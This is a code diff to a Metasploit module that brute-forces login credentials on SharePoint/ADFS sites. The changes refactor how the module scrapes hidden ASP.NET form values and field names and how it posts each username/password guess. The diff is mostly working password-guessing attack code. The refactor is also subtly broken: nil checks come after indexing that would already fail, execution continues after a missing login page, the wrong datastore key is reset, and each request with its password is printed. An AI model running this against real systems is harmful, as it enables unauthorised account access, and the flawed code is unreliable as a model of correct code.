@@ -15,9 +15,9 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'           => 'Sharepoint/ADFS Brute Force',
+			'Name'           => 'Sharepoint/ADFS Brute Force Utility',
 			'Description'    => %q{
-				This module tests credentials on Sharepoint/AFDS. AuthPath needs to be set to 
+				This module tests credentials on Sharepoint/AFDS. AuthPath needs to be set to
 				the GET request you see in you browser bar after you browsed to the target website
 				(something like /adfs/ls/?wa=wsignin1.0&wtrealm=...). The module tries to
 				gather various POST parameters that differ among different installations of
@@ -85,6 +85,57 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
+	def extract_form_values(res)
+		#Gather __VIEWSTATE and __EVENTVALIDATION and __db from HTTP response.
+		#Required to be sent based on some versions/configs.
+
+		datastore['viewstate'] = res.body.scan(/<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*)"/)[0][0]
+		datastore['viewstate'] = "" if datastore['viewstate'].nil?
+
+		datastore['eventvalidation'] = res.body.scan(/<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*)"/)[0][0]
+		datastore['eventvalidation'] = "" if datastore['eventvalidation'].nil?
+
+		datastore['db'] = res.body.scan(/<input type="hidden" name="__db" value="(.*)"/)[0][0]
+		datastore['db'] = "" if datastore['db'].nil?
+
+		#Gather form names from reponse these differ among sharepoint/adfs installations
+		#Automatic parsing may not always work, but it is possible to set these manually
+		if datastore['UsernameField'] == ""
+			print_status("Trying to guess UsernameField form field")
+			datastore['UsernameField'] = res.body.scan(/<input name="(.*)" type="text" (.*)"/)[0][0]
+
+		end
+
+		if(datastore['UsernameField'].nil?)
+			print_error("#{msg} Could not extract UsernameField form field automatically, set manually")
+			datastore['UsernameField'] = ""
+		end
+
+		if datastore['PasswordField'] == ""
+			print_status("Trying to guess PasswordField form field")
+			datastore['PasswordField'] = res.body.scan(/<input name="(.*)" type="password" (.*)"/)[0][0]
+		end
+
+		if(datastore['PasswordField'].nil?)
+			print_error("#{msg} Could not extract PasswordField form field automatically, set manually")
+			datastore['Password'] = ""
+		end
+
+		if datastore['SubmitButton'] == ""
+			print_status("Trying to guess SubmitButton form field")
+			submitbtntmp = res.body.scan(/<input type="submit" name="(.*)" value="(.*)" (.*)/)
+
+			if(submitbtntmp.nil?)
+				print_error("#{msg} Could not extract SubmitButton form field automatically, set manually")
+				datastore['SubmitButton'] = ""
+			end
+
+			datastore['SubmitName'] = submitbtntmp[0][0]
+			# kludge, it's not so easy to find regexp that works for many installations
+			datastore['SubmitValue'] = submitbtntmp[0][1].split(/"/)[0]
+		end
+	end
+
 	def run
 		# Store the original setting
 		@blank_passwords_setting = datastore['BLANK_PASSWORDS']
@@ -110,68 +161,12 @@ class Metasploit3 < Msf::Auxiliary
 				'uri'     => datastore['AuthPath']
 		}, 20)
 
-		if (res.code == 200)
-				print_status("Sharepoint install found at #{target_url}  [HTTP 200]")
-
-                                #Gather __VIEWSTATE and __EVENTVALIDATION and __db from HTTP response.
-                                #Required to be sent based on some versions/configs.
-				begin
-					datastore['viewstate'] = res.body.scan(/<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*)"/)[0][0]
-				rescue
-					datastore['viewstate'] = ""
-				end
-
-				begin
-					datastore['eventvalidation'] = res.body.scan(/<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*)"/)[0][0]
-				rescue
-					datastore['eventvalidation'] = ""
-				end
-
-				begin
-					datastore['db'] = res.body.scan(/<input type="hidden" name="__db" value="(.*)"/)[0][0]
-				rescue
-					datastore['db'] = ""
-				end
-
-				#Gather form names from reponse these differ among sharepoint/adfs installations
-				#Automatic parsing may not always work, but it is possible to set these manually
-				if datastore['UsernameField'] == ""
-					begin
-						print_status("Trying to guess UsernameField form field")
-						datastore['UsernameField'] = res.body.scan(/<input name="(.*)" type="text" (.*)"/)[0][0]
-					rescue
-						print_error("#{msg} Could not extract UsernameField form field automatically, set manually")
-						datastore['UsernameField'] = ""
-					end
-				end
-
-				if datastore['PasswordField'] == ""
-					begin
-						print_status("Trying to guess PasswordField form field")
-						datastore['PasswordField'] = res.body.scan(/<input name="(.*)" type="password" (.*)"/)[0][0]
-					rescue
-						print_error("#{msg} Could not extract PasswordField form field automatically, set manually")
-						datastore['Password'] = ""
-					end
-				end
-
-				if datastore['SubmitButton'] == ""
-					begin
-						print_status("Trying to guess SubmitButton form field")
-						submitbtntmp = res.body.scan(/<input type="submit" name="(.*)" value="(.*)" (.*)/)
-						submitname = submitbtntmp[0][0]
-						# kludge, it's not so easy to find regexp that works for many installations
-						submitvalue =submitbtntmp[0][1].split(/"/)[0]
-						datastore['SubmitButton'] = "#{submitname}=#{submitvalue}"
-					rescue
-						print_error("#{msg} Could not extract SubmitButton form field automatically, set manually")
-						datastore['Password'] = ""
-					end
-				end
-
-		else
-			print_error("Sharepoint login page not found at #{target_url}. May need to set VHOST or RPORT.  [HTTP #{res.code}]")
+		if (res.code != 200)
+			print_error("Sharepoint login page not found at #{target_url}. May need to set VHOST or RPORT. [HTTP #{res.code}]")
 		end
+
+		print_status("Sharepoint install found at #{target_url} [HTTP 200]")
+		extract_form_values(res)
 
 		# Here's a weird hack to check if each_user_pass is empty or not
 		# apparently you cannot do each_user_pass.empty? or even inspect() it
@@ -203,33 +198,33 @@ class Metasploit3 < Msf::Auxiliary
 		}
 
 		# Fix encoding
-		viewstate = Rex::Text.uri_encode(datastore['viewstate'].to_s).sub("/","%2F")
-		eventvalidation = Rex::Text.uri_encode(datastore['eventvalidation'].to_s).sub("/","%2F")
+		viewstate = Rex::Text.uri_encode(datastore['viewstate'])
+		eventvalidation = Rex::Text.uri_encode(datastore['eventvalidation'])
 		db = datastore['db'].to_s
 
-		print_status("Viewstat is #{viewstate}...,  Eventvalidation is #{eventvalidation}..., db is #{db}")
-
-		userfield = datastore['UsernameField'].sub("$","%24")
-		passfield = datastore['PasswordField'].sub("$","%24")
-		submitbutton = datastore['SubmitButton'].sub("$","%24")
-
-		post_data =  "__VIEWSTATE=#{viewstate}"
-		post_data << "&__EVENTVALIDATION=#{eventvalidation}"
-		post_data << "&__db=#{db}"
-		post_data << "&#{userfield}=#{user}"
-		post_data << "&#{passfield}=#{pass}"
-		post_data << "&#{submitbutton}"
+		userfield = Rex::Text.uri_encode(datastore['UsernameField'])
+		passfield = Rex::Text.uri_encode(datastore['PasswordField'])
+		submitname = Rex::Text.uri_encode(datastore['SubmitName'])
+		submitvalue = Rex::Text.uri_encode(datastore['SubmitValue'])
 
 		retryreq = false
 		begin
 			res = send_request_cgi({
-				'encode'   => false,
-				'uri'      => auth_path,
-				'method'   => 'POST',
-				'headers'  => headers,
-				'data'     => post_data
+				'encode'	=> false,
+				'uri'		=> auth_path,
+				'method'	=> 'POST',
+				'headers'	=> headers,
+				'vars_post'	=> {
+					'__VIEWSTATE'		=> viewstate,
+					'__EVENTVALIDATION'	=> eventvalidation,
+					'__db'			=> db,
+					userfield		=> user,
+					passfield		=> pass,
+					submitname		=> submitvalue
+				},
 			}, 25)
 
+		print_status(res.request)
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
 			print_error("#{msg} HTTP Connection Failed, retrying")
 			retryreq = true
